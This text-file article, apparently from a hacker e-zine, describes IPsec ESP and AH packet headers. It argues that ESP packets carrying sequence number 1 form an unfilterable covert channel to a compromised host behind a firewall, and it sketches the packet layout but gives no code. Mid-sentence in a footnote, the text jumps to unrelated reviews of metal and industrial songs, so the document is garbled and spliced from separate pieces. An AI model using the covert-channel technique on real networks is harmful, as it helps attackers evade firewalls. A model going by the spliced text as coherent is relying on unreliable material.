Sequence number (32-bit number)
Encrypted Payload (variable) containing:
  Next Packet (variable)
  Padding (0-255 bytes)
  Pad Length (8-bit number)
  Next Header (8-bit number)
Authentication Data (variable and optional)

An AH packet looks like:

Next Header (8-bit number)
Payload Length (8-bit number)
Reserved (16 bits of zeros. Don't ask.)
SPI (32-bit number)
Sequence number (32-bit number)
Authentication Data (variable)
(and then the auth'd packet)

  This is really all self-explanatory stuff, except maybe for the
sequence number. It must be present, it must start at 1 for each
different SPI, and (if the two hosts involved so agree) before the
2^32'nd packet transmitted with that SPI, something has to establish a
new SA for the two hosts to use. It thus enables anti-replay protection.
Now why it has to be present in _all_ packets, and why it has to start
from one instead of some random value that could be decided upon at SA
negotiation time, is unclear, but it won't give us much trouble.

-=:[ .the.crime.

It turns out, this gives us a big shiny covert channel.

  "Covert channel" sounds scary, conjuring images of spies and secret
missions and the government will deny all knowledge and so forth. In
reality, it's just a message being extracted from a data sequence in
something other than the expected way.  httptunnel is a covert channel.
Loki is a covert channel. Steganography is a covert channel. The
abomination that is MS's SOAP is a covert channel.

  Covert channels are the kind of things that firewall vendors hate,
because they mean you have to do stateful inspection on the data stream
to see if it's behaving like a good non-covert channel, and that's
_hard_, and even then you aren't sure. Suppose I set up my firewall to
only allow port 80 inbound; well, if my webserver gets compromised, I
could just send a magic header field to it and have it spawn a shell for
me, which would a) not be the way HTTP is expected to act and b) defeat
the purpose of filtering out telnet traffic at the firewall.

  I think firewalls are dumb, because they promote laziness and make it
okay to "get away with" otherwise insecure things inside the firewall.
So let's play, shall we?

  Let's say we have control of some box inside the firewall, and we can
get ESP traffic to it. Well, "ESP traffic" really means "IP packets with
the next header field set to 50". Well, now, if we were a firewall, what
fields does ESP give us that we could filter? We can't filter based on
anything in the encrypted payload, because it's (ostensibly) encrypted
and thus (to the firewall) gibberish. We can't filter based on the
authentication data, because we a) are not guaranteed that it be present,
b) don't know the hash algorithm being used, and c) don't know the key
used with the hash algorithm. We also can't expect anything about the
size or alignedness of the packet.

  We're left with SPI and sequence number. The SPI is supposed to be a
random number for each SA the two hosts negotiate, so we can't expect it
to be predictable. However, for each SPI, the sequence number has to
start at 1, thank you RFC2406. Easy enough. Let's build a packet:

[ IP header | next = 50 ]
[ random number ]
[ 1 ]
[ our payload ]

  That's it. If the firewall lets ESP through to the destination host at
all, then we have acheived an unfilterable covert channel.

-=:[ .the.tension.

  What's this mean? Well, remember, covert channels require some extra
code on both ends, so we're assuming something compromised inside the
firewall. I now have an unfiltered data stream to a compromised host. I
could sniff your network, use the compromised machine as a bounce point
to other places in your network, any number of sneaky things. End-to-end
ESP thus requires secure ends. If you're doing net-to-net ESP, you
probably don't want to allow ESP traffic to or from anything but the ESP
gateway.

  Is this a new problem? No. Clearly. But it reinforces the case for not
relying on firewalls for your security. It's impossible to secure a
network without actually securing the machines on it.

-=:[ .the.revelation.

  You know what'd be really cool? A kernel module and preloadable .so
combo that would do this for you automatically. It's a real shame that I
don't have it done yet. But you'll live. Check in on http://firest0rm.org/
for a release notice.

[ Real Soon Now, I hope. I'm interested {kynik} ]

-=:[ .authors.notes.

[1] - "SPI" stands for security parameters index. The kernel maintains a
database of mappings from SPI numbers to their associated encryption and
authentication algorithms and keying material for each.

[2] - "SA" stands for security association, and "an SA" means "an SPI and

example of it's genre. Snarling guitar, straightforward drums, with an
odd tinkle of cowbells. The singer's surprisingly melodic for screaming
metal - not quite howls of agony. Suprisingly robust, with undertones of
melody. Not destined for my cellar, but sure to please the palettes of
some.

Oh, what Metallica should have been. If Metallica hadn't got sucked into
the pop music market, this is probablt what they would have sounded like.
Aggressive vocals, yet still melodic; thundering bass; kick-out-your-teeth
guitar; and drums that remind you that all Lars plays anymore is slow
4-beat crap. Yes, I've seen these guys many times, and they do the odd
Metallica covers, but they are certainly their own band. In this song, for
example, the 7-string guitar and the 5-string (custom!) bass really shine
though. Good luck to them on getting their tour van fixed!

Pretty much straight up metal here. Not bad, not bad at all, but you've
heard it. As with most metal bands, the drummer and bassist are crucial,
and Condition 1 has a good pair. The singer actually has some melody
here, which is good, but the delay on his voice maybe echoes a little
loud. Actually, no, I take that back. The guitarist is pretty generic,
though, which is a shame; with either a little better lead line or a
little better production he could sound really good. But it's a fun hook
and a good backbeat, something to blast out the car stereo in picket-fence
neighborhoods.


The next song is from a band called Man(i)kin. You can find them at:

The song is called "Deity":

Okay. I know the ridiculously heavy distortion on the instruments and the
vocals is intentional. I'm aware of industrial. But, no. There a right
way and a wrong way to do distortion, especially on vocals, and this was
the wrong way. It actually sounds more like they hooked up a white noise
generator to a talkbox. But at least the drumkit and the synth line are
well programmed, if nothing earth-shattering. I could see this song being
an excellent candidate for a remix, maybe a nice breakbeat under it
instead of the idiot-house kick drum beat. If industrial's your thing,
you'll like this, but if it's not, it won't convert you.

I liked this song a lot better the first time I heard it. On repeat, it
sounds like the Trent Reznor angst generation. The hiss leaves me
thinking of bootleg audio. To give the lead singer credit, he's got
excellent enunciation - although that doesn't entirely fit the style of
the song. All in all - I'd dance to it - don't know that I'd keep it.

Unfortunately, this sounds like oh-so-many other 'goth' or 'industrial'
bands out there. A huge pet peeve of mine when it comes to music is
overused vocal effects. Being a vocalist, it irks me to no end when you
can't really tell what the vocalist's voice sounds like. The sound is
probably the redeeming factor for the song, since it was put together
quite well, despite the bland not-much-bass 'thump-thump' this consists
of.
